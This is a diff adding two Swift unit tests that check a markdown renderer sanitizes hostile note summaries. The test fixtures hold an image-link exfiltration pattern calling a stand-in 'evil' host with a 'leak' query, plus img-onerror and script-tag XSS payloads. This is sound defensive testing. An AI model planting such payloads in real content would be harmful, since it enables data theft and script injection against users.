@@ -43,3 +43,19 @@ private func processedNote(summary: String) -> String {
     #expect(MarkdownRenderer().summaryBody(fromProcessedNote: "# Title\n\nBody only.") == "Body only.")
     #expect(MarkdownRenderer().summaryBody(fromProcessedNote: "Plain text.") == "Plain text.")
 }
+
+@Test func renderProcessedNoteSanitizesHostileSummary() {
+    let hostile = "## Summary\n\n![x](http://evil/?q=leak) <img src=x onerror=alert(1)> <script>alert(1)</script>"
+    let note = processedNote(summary: hostile)
+    #expect(!note.contains("!["))
+    #expect(!note.contains("<img"))
+    #expect(!note.contains("<script"))
+    #expect(note.contains("&lt;img"))
+}
+
+@Test func summaryBodyRoundTripsOnSanitizedNote() {
+    let hostile = "## Summary\n\n![x](http://evil/?q=leak)\n\n- Discussed flights."
+    let sanitized = ZMeetText.sanitizeNoteMarkdown(hostile)
+    let body = MarkdownRenderer().summaryBody(fromProcessedNote: processedNote(summary: hostile))
+    #expect(body == sanitized)
+}
